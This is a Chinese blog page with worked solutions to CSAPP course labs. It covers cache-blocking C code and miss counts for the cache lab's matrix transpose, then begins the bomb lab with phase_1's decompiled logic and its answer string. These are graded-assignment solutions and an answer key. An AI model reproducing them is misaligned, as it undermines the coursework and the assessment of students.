<p>• 32 × 32: 8 points if m &lt; 300, 0 points if m &gt; 600<br>• 64 × 64: 8 points if m &lt; 1, 300, 0 points if m &gt; 2, 000<br>• 61 × 67: 10 points if m &lt; 2, 000, 0 points if m &gt; 3, 000</p>
<h4 id="32x32"><a href="#32x32" class="headerlink" title="32x32"></a>32x32</h4><p>首先可以看到普通的按行转置的方法在的数据为: hits:870  misses: 1183  evictions: 1151（32x32）</p>
<p>给定的cache参数为s=5,E=1,b=5，即有32个组，每个组一行，每一行存储32个字节的块</p>
<p>要减少miss的情况，主要要解决冲突不命中的情况。</p>
<p>首先，根据每一个行存储32字节的块，可以推出每一个块一次可以读入8个int，那么我们就可以直接使用8个临时变量将块内的8个int值存在寄存器中，防止后续出现冲突导致它们被换出。根据这个想法，我们改进一下示例代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">int</span> tmp1,tmp2,tmp3,tmp4;</span><br><span class="line"><span class="keyword">int</span> tmp5,tmp6,tmp7,tmp8; </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)&#123;</span><br><span class="line">        tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">        tmp5=A[i][j+<span class="number">4</span>];  tmp6=A[i][j+<span class="number">5</span>];  tmp7=A[i][j+<span class="number">6</span>];  tmp8=A[i][j+<span class="number">7</span>];</span><br><span class="line">        B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">        B[j+<span class="number">4</span>][i]=tmp5;  B[j+<span class="number">5</span>][i]=tmp6; B[j+<span class="number">6</span>][i]=tmp7;   B[j+<span class="number">7</span>][i]=tmp8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>试着测试一下这个改进代码的性能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func 0 (Transpose submission): hits:898, misses:1155, evictions:1123</span><br></pre></td></tr></table></figure>

<p>很遗憾，这种运行模式好像没有提高性能。</p>
<p>我在这里卡了一段时间，最后得到的结论是，需要进一步的了解A，B的内存地址与cache的映射，这样才能做更加细致的分析和优化。</p>
<p>查看测试生成的数据trace.f0。在多次运行数据后，我发现多次测试生成的数组A的地址(0x0030a080)和数组B的地址(0x0034a080)都是固定的，那么我们就能够分析它们分别对应于cache中的哪个组，已经对应的标记位。</p>
<p>根据addr(A)=0x0030a080，addr(B)=0x0034a080，可以发现它们都映射到组4，但是都拥有不同的标记位。</p>
<p>具体分析我们上面的改进代码可以发现，每一轮中的8个对数组A的加载操作只会产生至多1次miss，但是每一次对于数组B的8次存储操作都会引发miss和evict。</p>
<p>下面给出 i=0,j=0 和 i=0，j=1这两个情况下，对数组B的存储操作的输出信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//i=0，j=0,冷启动,---&gt;右侧表示该内存地址对于的cache组</span></span><br><span class="line"> S <span class="number">0034</span>a080,<span class="number">4</span> miss evicts --&gt; saddr=<span class="number">4</span></span><br><span class="line"> S <span class="number">0034</span>a100,<span class="number">4</span> miss  --&gt; saddr=<span class="number">8</span></span><br><span class="line"> S <span class="number">0034</span>a180,<span class="number">4</span> miss  --&gt; saddr=<span class="number">12</span></span><br><span class="line"> S <span class="number">0034</span>a200,<span class="number">4</span> miss  --&gt; saddr=<span class="number">16</span></span><br><span class="line"> S <span class="number">0034</span>a280,<span class="number">4</span> miss  --&gt; saddr=<span class="number">20</span></span><br><span class="line"> S <span class="number">0034</span>a300,<span class="number">4</span> miss  --&gt; saddr=<span class="number">24</span></span><br><span class="line"> S <span class="number">0034</span>a380,<span class="number">4</span> miss  --&gt; saddr=<span class="number">28</span></span><br><span class="line"> S <span class="number">0034</span>a400,<span class="number">4</span> miss  --&gt; saddr=<span class="number">0</span></span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line"> <span class="comment">//i=0,j=1,--&gt;右侧表示被“驱逐出”cache的内存块的信息()</span></span><br><span class="line"> S <span class="number">0034</span>a480,<span class="number">4</span> miss evicts --&gt; evicts taddr=<span class="number">3368</span> saddr=<span class="number">4</span></span><br><span class="line"> S <span class="number">0034</span>a500,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">8</span></span><br><span class="line"> S <span class="number">0034</span>a580,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">12</span></span><br><span class="line"> S <span class="number">0034</span>a600,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">16</span></span><br><span class="line"> S <span class="number">0034</span>a680,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">20</span></span><br><span class="line"> S <span class="number">0034</span>a700,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">24</span>    </span><br><span class="line"> S <span class="number">0034</span>a780,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3368</span> saddr=<span class="number">28</span></span><br><span class="line"> S <span class="number">0034</span>a800,<span class="number">4</span> miss evicts     evicts taddr=<span class="number">3369</span> saddr=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以看到第一轮加载入cache的B的内存块，在第二轮循环中全部被替换出cache，根据输出数据，后续的每一轮循环都会发生这种情况。</p>
<p>那么如何在保证对A维持这样高效的读取的同时，减少对B的冲突不命中呢？</p>
<p>这样就需要修改读取顺序，举例说我们第一组读入的是</p>
<p>B[ 0 ] [ 0 ]，B[ 1 ] [ 0 ]，B[ 2 ] [ 0 ]，B[ 3 ] [ 0 ]，B[ 4 ] [ 0 ]，B[ 5 ] [ 0 ]，B[ 6 ] [ 0 ]，B[ 7 ] [ 0 ]</p>
<p>那么假设我们第二轮读入的不是 B[ 8 ] [ 0 ]，B[ 9 ] [ 0 ]….</p>
<p>而是B[ 0 ] [ 1 ]，B[ 1 ] [ 1 ]，B[ 2 ] [ 1 ]，B[ 3 ] [ 1 ]，B[ 4 ] [ 1 ]，B[ 5 ] [ 1 ]，B[ 6 ] [ 1 ]，B[ 7 ] [ 1 ]</p>
<p>这样第二轮对于B的读取就能够全部命中（准确的说不一定是全部命中，有时会与A发生一次冲突)，并且对于A的高效读取策略也能够兼容。</p>
<p>根据以上的思路修改代码循环的顺序，得到以下代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> tmp1,tmp2,tmp3,tmp4;</span><br><span class="line">    <span class="keyword">int</span> tmp5,tmp6,tmp7,tmp8;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">            tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">            tmp5=A[i][j+<span class="number">4</span>];  tmp6=A[i][j+<span class="number">5</span>];  tmp7=A[i][j+<span class="number">6</span>];  tmp8=A[i][j+<span class="number">7</span>];</span><br><span class="line">            B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">            B[j+<span class="number">4</span>][i]=tmp5;  B[j+<span class="number">5</span>][i]=tmp6; B[j+<span class="number">6</span>][i]=tmp7;   B[j+<span class="number">7</span>][i]=tmp8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//外循环按列，内循环按行，每一次在A中横着连续读8个int</span></span><br></pre></td></tr></table></figure>

<p>测试后得到性能如下，miss&lt;300，成功通过第一个测试点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func 0 (Transpose submission): hits:1766, misses:287, evictions:255</span><br></pre></td></tr></table></figure>



<h4 id="64x64"><a href="#64x64" class="headerlink" title="64x64"></a>64x64</h4><p>先使用32x32的代码测试一下，最后得到miss&gt;4000，可以知道，同样的代码在不同的矩阵下是无法通用的，根据讲义上的提示，我们可以根据每个测试点量身定做它独有的访问模式来提高缓存命中率。</p>
<p>重新审视一下这个矩阵，会发现由于列数从32扩展至64，使得每一行的元素实际上需要8个缓存组才能装下，这也说明，我们每次跨越一行，实际上跨越了8个缓存组，由于总共只有32个缓存组，所以在连续转换4行后，再转换到第五行时，会发生冲突不命中，将第一行的缓存数据驱逐出去，这就是我们沿用32x32的策略却效率很差的原因。</p>
<p>通过上述分析后，得出当一次只转置连续4个元素时，就不会发生冲突，这样就得到以下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">int</span> tmp1,tmp2,tmp3,tmp4;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">        B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到测试结果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func 0 (Transpose submission): hits:6546, misses:1651, evictions:1619</span><br></pre></td></tr></table></figure>

<p>可以看到miss的数量大幅下降，但是还未低于1300。</p>
<p>进一步分析，上述方法中，对B的每一个块只发生一次miss，但是对A的每一个块则发生两次miss(前4个元素一次，后四个一次)，那我们也许可以试着让A的每一个块只发生一次miss，即每一次都直接将块中的8个元素读出，前4个元素直接转换，但是后4个不能马上转换（如果立即转换就会发生冲突，参考上面关于32x32模式的低效原因），这时我们可以把它放在B的其他位置，因为我们有32个缓存组，但是实际上同一时间内的使用率却非常低，所以可以将它存放在不会发生冲突的缓存组。</p>
<p>我们计算一下对于一个8x8的块，这种改进的方法是否会优化miss数。</p>
<p>首先考虑一次只读4个元素转置的方法: misses=8(读入B的8个行)+16(每次读入A的半行)=24</p>
<p>再考虑改进后的方法: missed=8(读入B的4个行)+8(每次读入A的一个行)+4(读入用于暂存A中后4列的4个临时块)=20</p>
<p>可以发现效率有小幅提高，尝试写出代码并查看结果是否如我们推测的那样。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i,j,k;</span><br><span class="line"><span class="keyword">int</span> tmp1,tmp2,tmp3,tmp4;</span><br><span class="line"><span class="keyword">int</span> tmp5,tmp6,tmp7,tmp8;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;N<span class="number">-8</span>;k+=<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=k;i&lt;k+<span class="number">8</span>;i++)&#123;</span><br><span class="line">            tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">            tmp5=A[i][j+<span class="number">4</span>]; tmp6=A[i][j+<span class="number">5</span>]; tmp7=A[i][j+<span class="number">6</span>]; tmp8=A[i][j+<span class="number">7</span>];</span><br><span class="line">            B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">            </span><br><span class="line">            B[j][i+<span class="number">8</span>]=tmp5;  B[j+<span class="number">1</span>][i+<span class="number">8</span>]=tmp6;  B[j+<span class="number">2</span>][i+<span class="number">8</span>]=tmp7;  B[j+<span class="number">3</span>][i+<span class="number">8</span>]=tmp8; </span><br><span class="line">            <span class="comment">//暂存在B中的空闲位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k;i&lt;k+<span class="number">8</span>;i++)&#123;  <span class="comment">//将暂存在B中空闲位置的数据转置到正确的位置</span></span><br><span class="line">            tmp1=B[j][i+<span class="number">8</span>]; tmp2=B[j+<span class="number">1</span>][i+<span class="number">8</span>]; tmp3=B[j+<span class="number">2</span>][i+<span class="number">8</span>]; tmp4=B[j+<span class="number">3</span>][i+<span class="number">8</span>];</span><br><span class="line">            B[j+<span class="number">4</span>][i]=tmp1; B[j+<span class="number">5</span>][i]=tmp2;  B[j+<span class="number">6</span>][i]=tmp3; B[j+<span class="number">7</span>][i]=tmp4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)&#123; <span class="comment">//转置到最后一个块时，B的其他位置已经全部转置完毕，没有额外的空间暂存</span></span><br><span class="line">    <span class="comment">//只能退化为4x4的方式(一次只读4个元素)</span></span><br><span class="line">    <span class="keyword">for</span>(i=N<span class="number">-8</span>;i&lt;N;i++)&#123;</span><br><span class="line">        tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">        B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到测试结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func 0 (Transpose submission): hits:10354, misses:1427, evictions:1395</span><br></pre></td></tr></table></figure>

<p>可以看到，miss数大约减少了1/6，和我们分析的大致相同（miss数的减少有偏差是因为我们上述是对非对角线的块分析，对于对角线上的块而言，A，B在缓存中对应的组相同，A和B之间会发生冲突不命中，所以这些块转置时产生的miss数和我们分析的不一样）。</p>
<p>后续由于我实在想不到更好的优化方法了，只好上网查看其他大佬的解法。这里贴出一个大佬的博客，我觉得他写的十分清晰，同时也有相应的图示。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xbb224007/article/details/81103995">https://blog.csdn.net/xbb224007/article/details/81103995</a></p>
<p>对于这种方法的解析可以直接看上面这个博客，相比于我提供的优化方法而言，这个方法更进一步，它不需要读入额外的4个暂存块，而是使用巧妙的方法在块的内部进行暂存和转置，我这里只贴出自己的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;N;k+=<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=k;i&lt;k+<span class="number">4</span>;i++)&#123;   <span class="comment">//前四行,前四列正常转置，后四列翻转后暂存在B的非对应位中</span></span><br><span class="line">            tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">            tmp5=A[i][j+<span class="number">4</span>]; tmp6=A[i][j+<span class="number">5</span>]; tmp7=A[i][j+<span class="number">6</span>]; tmp8=A[i][j+<span class="number">7</span>];</span><br><span class="line">            B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">            B[j][i+<span class="number">4</span>]=tmp5; B[j+<span class="number">1</span>][i+<span class="number">4</span>]=tmp6; B[j+<span class="number">2</span>][i+<span class="number">4</span>]=tmp7; B[j+<span class="number">3</span>][i+<span class="number">4</span>]=tmp8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(d=j;d&lt;j+<span class="number">4</span>;d++)&#123;  <span class="comment">//后四行前四列(corner case)</span></span><br><span class="line">            tmp1=A[k+<span class="number">4</span>][d]; tmp2=A[k+<span class="number">5</span>][d]; tmp3=A[k+<span class="number">6</span>][d]; tmp4=A[k+<span class="number">7</span>][d];</span><br><span class="line">            tmp5=B[d][k+<span class="number">4</span>]; tmp6=B[d][k+<span class="number">5</span>]; tmp7=B[d][k+<span class="number">6</span>]; tmp8=B[d][k+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">            B[d][k+<span class="number">4</span>]=tmp1;  B[d][k+<span class="number">5</span>]=tmp2; B[d][k+<span class="number">6</span>]=tmp3; B[d][k+<span class="number">7</span>]=tmp4;</span><br><span class="line">            <span class="comment">//这两行的顺序很重要，不能颠倒，否则会导致大量的冲突不命中</span></span><br><span class="line">            B[<span class="number">4</span>+d][k]=tmp5; B[<span class="number">4</span>+d][k+<span class="number">1</span>]=tmp6; B[<span class="number">4</span>+d][k+<span class="number">2</span>]=tmp7; B[<span class="number">4</span>+d][k+<span class="number">3</span>]=tmp8;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k+<span class="number">4</span>;i&lt;k+<span class="number">8</span>;i++)&#123;  <span class="comment">//后四行后四列，按4x4块的模式转置</span></span><br><span class="line">            tmp1=A[i][j+<span class="number">4</span>]; tmp2=A[i][j+<span class="number">5</span>]; tmp3=A[i][j+<span class="number">6</span>];  tmp4=A[i][j+<span class="number">7</span>];</span><br><span class="line">            B[j+<span class="number">4</span>][i]=tmp1; B[j+<span class="number">5</span>][i]=tmp2; B[j+<span class="number">6</span>][i]=tmp3;  B[j+<span class="number">7</span>][i]=tmp4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终运行效率如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147</span><br></pre></td></tr></table></figure>



<h4 id="61x67"><a href="#61x67" class="headerlink" title="61x67"></a>61x67</h4><p>可以发现，当列数由64变为67时，数组中不同元素在cache中对应的组也会发生变化。</p>
<p>下面取前8行第一个元素，分析它们在不同矩阵中所属缓存组的变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在64x64矩阵中                         &#x2F;&#x2F;在61x67矩阵中</span><br><span class="line">A[0][0]---&gt;saddr&#x3D;4                     A[0][0]-----&gt;saddr&#x3D;4</span><br><span class="line">A[1][0]---&gt;saddr&#x3D;12                    A[1][0]-----&gt;saddr&#x3D;11</span><br><span class="line">A[2][0]---&gt;saddr&#x3D;20                    A[2][0]-----&gt;saddr&#x3D;19</span><br><span class="line">A[3][0]---&gt;saddr&#x3D;28                    A[3][0]-----&gt;saddr&#x3D;26</span><br><span class="line">A[4][0]---&gt;saddr&#x3D;4                     A[4][0]-----&gt;saddr&#x3D;2</span><br><span class="line">A[5][0]---&gt;saddr&#x3D;12                    A[5][0]-----&gt;saddr&#x3D;10</span><br><span class="line">A[6][0]---&gt;saddr&#x3D;20                    A[6][0]-----&gt;saddr&#x3D;17</span><br><span class="line">A[7][0]---&gt;saddr&#x3D;28                    A[7][0]-----&gt;saddr&#x3D;25</span><br></pre></td></tr></table></figure>

<p>所属缓存组的变化会直接影响到冲突不命中的情况，当元素的所属组不同时，就能够更加充分的利用cache的空间，我们就能够使用更大的分块处理数据，并且能够得到一个较低的miss数。</p>
<p>通过分析得知，在61x67矩阵中，我们可以像32x32矩阵那样一次处理8x8的分块，并且不会发生大量的冲突不命中（64x64则会发生大量冲突），所以我们可以先试着对其进行8x8的分块，最右侧剩余(61%8=5)的部分单独处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(j==<span class="number">56</span>)&#123;</span><br><span class="line">         tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  </span><br><span class="line">         tmp4=A[i][j+<span class="number">3</span>];  tmp5=A[i][j+<span class="number">4</span>];</span><br><span class="line">         B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  </span><br><span class="line">         B[j+<span class="number">3</span>][i]=tmp4; B[j+<span class="number">4</span>][i]=tmp5;</span><br><span class="line">      &#125;</span><br><span class="line">      tmp1=A[i][j];  tmp2=A[i][j+<span class="number">1</span>];  tmp3=A[i][j+<span class="number">2</span>];  tmp4=A[i][j+<span class="number">3</span>];</span><br><span class="line">      tmp5=A[i][j+<span class="number">4</span>];  tmp6=A[i][j+<span class="number">5</span>];  tmp7=A[i][j+<span class="number">6</span>];  tmp8=A[i][j+<span class="number">7</span>];</span><br><span class="line">      B[j][i]=tmp1;  B[j+<span class="number">1</span>][i]=tmp2;  B[j+<span class="number">2</span>][i]=tmp3;  B[j+<span class="number">3</span>][i]=tmp4;</span><br><span class="line">      B[j+<span class="number">4</span>][i]=tmp5;  B[j+<span class="number">5</span>][i]=tmp6; B[j+<span class="number">6</span>][i]=tmp7;   B[j+<span class="number">7</span>][i]=tmp8;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>性能测试结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Summary for official submission (func 0): correctness&#x3D;1 misses&#x3D;1852</span><br></pre></td></tr></table></figure>

<p>可以发现，我们只是简单的做了个8x8的分块，就达到了要求，看来这个测试点还是比较水的- -</p>
<p>最终测试结果:</p>
<p><img src="https://s1.ax1x.com/2020/09/04/wA8DRP.png" alt="wA8DRP.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/30/csapp-bombLab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/30/csapp-bombLab/" class="post-title-link" itemprop="url">csapp-bomblab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-08-30 00:02:15" itemprop="dateCreated datePublished" datetime="2020-08-30T00:02:15+08:00">2020-08-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-04 22:34:18" itemprop="dateModified" datetime="2020-09-04T22:34:18+08:00">2020-09-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/csapp/" itemprop="url" rel="index"><span itemprop="name">csapp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="CSAPP-BombLab"><a href="#CSAPP-BombLab" class="headerlink" title="CSAPP-BombLab"></a>CSAPP-BombLab</h2><p>GDB简要指南:<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf</a></p>
<p>BombLab主要是为了学习如何阅读汇编代码和使用调试工具。</p>
<p>在csapp的网站下载的实验文件有3个，我们需要使用的是bomb文件，以及bomb.c文件，</p>
<p>bomb.c文件是用于方便我们了解实验的流程的。</p>
<p>而bomb则是实验的主要内容，使用objdump将它转为汇编代码，然后根据main函数的执行流程一路追踪程序的走向，这个lab总共有6个phase，每一个phase要求我们输入一个字符串，如果字符串不符合要求炸弹就会爆炸，我们需要通过跟踪观察它们的汇编代码来找到正确的字符串。</p>
<h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_1</span><span class="params">(<span class="keyword">char</span>* input)</span></span>&#123;</span><br><span class="line">	<span class="comment">//input in %rdi</span></span><br><span class="line">    <span class="keyword">char</span>* cmp=<span class="number">0x402400</span>;</span><br><span class="line">    <span class="keyword">if</span>(strings_not_equal(input,cmp)) <span class="comment">//相等返回0，不等返回1</span></span><br><span class="line">        explode_bomb();  <span class="comment">//答案错误，炸弹爆炸</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将phase_1对应的汇编代码翻译为C程序。</p>
<p>由C程序可知，phase_1将我们输入的字符串和地址为0x402400的字符串相比较，如果不等则失败，相等则成功，所以我们只要调试得到0x402400处的内容就行。</p>
<p>得到第一个答案“Border relations with Canada have never been better.”</p>
